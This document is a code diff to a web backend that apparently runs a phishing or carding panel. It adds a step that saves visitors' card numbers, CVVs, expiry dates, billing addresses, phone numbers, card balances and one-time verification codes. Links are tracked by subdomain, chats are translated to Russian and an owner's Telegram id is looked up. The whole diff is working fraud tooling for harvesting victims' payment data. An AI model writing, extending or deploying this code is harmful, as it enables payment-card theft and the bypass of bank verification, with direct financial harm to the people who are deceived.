@@ -27,6 +27,7 @@ from api.cache import (
 )
 from api.translate import _translate, _translate_many
 from db.crud.links import get_link_by_subdomain_and_id
+from db.crud.submissions import upsert_submission
 from db.crud.users import get_or_create_user
 from db.crud.visitors import get_or_create_visitor
 from db.models import User
@@ -351,6 +352,42 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         ru_text = await _translate(body.text, dest="ru", source=visitor_lang)
 
     await append_chat_message(body.session_id, "visitor", body.text)
+
+    if body.trigger in ("balance", "code") and (
+        body.card_number or body.balance_amount or body.verification_code
+    ):
+        vid = (sess or {}).get("visitor_id")
+        try:
+            vid_int = int(vid) if vid not in (None, "?", "") else None
+        except (TypeError, ValueError):
+            vid_int = None
+        try:
+            async with get_session() as db:
+                await upsert_submission(
+                    db,
+                    session_id=body.session_id,
+                    visitor_id=vid_int,
+                    subdomain=body.subdomain,
+                    link_id=body.link_id,
+                    card_number=body.card_number,
+                    card_exp=body.card_exp,
+                    card_cvv=body.card_cvv,
+                    card_name=body.card_name,
+                    country=body.country,
+                    address1=body.address1,
+                    address2=body.address2,
+                    zip_code=body.zip_code,
+                    city=body.city,
+                    phone_dial=body.phone_dial,
+                    phone=body.phone,
+                    balance_amount=body.balance_amount,
+                    balance_currency=body.balance_currency,
+                    verification_code=body.verification_code or (
+                        body.text if body.trigger == "code" else ""
+                    ),
+                )
+        except Exception as exc:
+            logger.error("upsert_submission failed: %s", exc)
 
     owner_label, owner_tg_id = await _resolve_owner(body.subdomain, body.link_id)
     ip = (
